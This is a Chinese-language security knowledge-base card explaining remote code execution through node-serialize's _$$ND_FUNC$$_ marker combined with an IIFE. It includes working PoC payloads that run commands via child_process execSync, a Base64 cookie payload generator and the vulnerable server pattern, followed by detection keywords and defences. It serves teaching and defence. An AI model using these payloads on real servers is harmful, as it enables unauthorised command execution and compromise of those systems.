---
id: web-nodejs-deserialization-node-serialize-funcflag-iife-rce
title: node-serialize _$$ND_FUNC$$_ 标记配合 IIFE 反序列化 RCE
type: scenario
domain: web
path: web/nodejs/deserialization
technique: node-serialize-funcflag-iife
tags:
- nodejs
- deserialization
- node-serialize
- eval
- rce
- iife
- child-process
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:08:23+08:00'
  notes: 已对照原文与 serialization 源码截图核对 FUNCFLAG eval 拼接、IIFE 触发与 child_process 执行；未验证点：未在本机复现，命令执行效果依赖原文调试/运行结果
url: /docs/web/nodejs/deserialization/web-nodejs-deserialization-node-serialize-funcflag-iife-rce/
draft: false
kb_aliases:
- node-serialize RCE
- _$$ND_FUNC$$_
- unserialize eval
- Node.js 反序列化
- IIFE 反序列化
---

## 一句话结论

`node-serialize` 的 `unserialize()` 会对以 `_$$ND_FUNC$$_` 开头的字符串执行 `eval('(' + 内容 + ')')`；攻击者在 JSON 值里塞入 `_$$ND_FUNC$$_function(){require('child_process').execSync('id');}()`，末尾的 `()` 把函数表达式变成 IIFE，反序列化时立即执行任意命令。

## 原理

- `node-serialize` 为了在 JSON 里保存函数，序列化时把函数 `toString()` 后加上固定前缀 `_$$ND_FUNC$$_`。
- 反序列化时，库先 `JSON.parse`（这一步安全，函数还只是字符串），然后递归遍历对象属性；发现字符串以该前缀开头，就执行：
  `obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')')`
- 外层括号的作用是把 `function(){...}` 变成函数表达式，让 `eval` 返回函数对象而不是把它当函数声明。正常情况下只生成函数、不执行。
- 如果字符串内容在函数表达式后追加一对调用括号 `()`，`eval` 实际求值的是 `(function(){...}())`。JavaScript 中“函数表达式 + 调用”就是立即调用函数表达式（IIFE），函数体在求值阶段立刻执行。
- 前缀只是普通字符串匹配，没有签名、类型或来源校验；任何能控制反序列化输入（Cookie、请求体、参数、消息）的攻击者都能注入该前缀。
- 函数体内可直接使用 Node 的 `child_process`（如 `execSync`）执行系统命令；在 CommonJS 模块作用域中 `require` 可用，若上下文受限可改用 `process.mainModule.require('child_process')` 等路径。

## 触发条件

- 应用依赖 `node-serialize`，并在服务端调用 `serialize.unserialize()` 处理用户可控输入。
- 攻击者能控制传入的字符串或对象属性值，且输入会进入上述 `eval` 分支。
- 目标 Node 进程有执行系统命令的权限；`require`/`child_process` 未被沙箱禁用。
- 输入未被提前白名单化或转义（例如只允许固定字段名仍可能被嵌套属性绕过）。

## 利用步骤

1. 确认入口：Cookie、POST body、WebSocket 消息等是否被 Base64/JSON 解码后直接送入 `unserialize()`。
2. 构造带 `_$$ND_FUNC$$_` 前缀的函数字符串，并在函数体后加 `()` 触发 IIFE。
3. 若入口有 Base64 等编码，先编码再发送。
4. 观察命令执行副作用（回连、写文件、DNS 外带等）；无回显时用 `execSync` 把结果写到可访问位置或发起外连。

## PoC

恶意反序列化字符串：

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id');}()"}
```

以 Cookie 承载并 Base64 编码的入口为例：

```javascript
const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id > /tmp/pwned\');}()"}';
console.log(Buffer.from(payload).toString('base64'));
// 将结果作为 profile Cookie 发送
```

生成脚本（正常序列化后在函数体后插入 `()`）：

```javascript
var serialize = require('node-serialize');
var y = { rce: function(){ require('child_process').execSync('calc'); } };
var str = serialize.serialize(y);
// 原始: ...function(){...}"
// 攻击: ...function(){...}()"
var payload = str.replace('}"', '}()"');
console.log(payload);
```

对应的脆弱服务端写法：

```javascript
var obj = serialize.unserialize(Buffer.from(req.cookies.profile, 'base64').toString());
```

## 变体与关联

- 触发位置变体：顶层属性、嵌套对象属性、数组元素都可；库会递归遍历。
- 执行原语变体：`child_process.execSync`/`exec`/`spawn`；也可用 `process.binding`、`require('fs')` 写文件、DNS/HTTP 外带。
- 载荷构造变体：手工拼 JSON 比 `replace('}"','}()"')` 更稳（多函数/嵌套时替换位置可能不对）；也可直接在字符串里写函数源码。
- 相关标记：`_$$ND_CC$$_` 用于循环引用，不直接执行代码，但可用于构造复杂对象；本卡只利用 FUNC 标记。
- 关联：[[web-nodejs-prototype-pollution-merge-json-parse]]（同为 Node 输入解析导致的对象/代码边界问题，但机制不同）。
- 边界：应用改用 `JSON.parse` 或安全反序列化库、输入被严格白名单、`eval` 被禁用/隔离（如 `vm` 沙箱）时不成立；`node-serialize` 本身已长期不维护，升级并不能修复该设计问题，应移除依赖。

## 检测与防御

- 检测：请求中出现 `_$$ND_FUNC$$_`、`function(){`、`child_process`、`execSync` 等特征；Node 进程 spawn `sh`/`cmd` 或异常外连；反序列化调用栈出现 `node-serialize` 的 `unserialize`。
- 防御：移除 `node-serialize`，改用 `JSON.parse` + 显式 schema 校验；禁止对不可信输入使用 `eval`/`Function`；对依赖做供应链审计；以低权限运行 Node，限制子进程与出站网络；WAF 拦截 FUNC 标记与危险函数关键字只能作为补充。
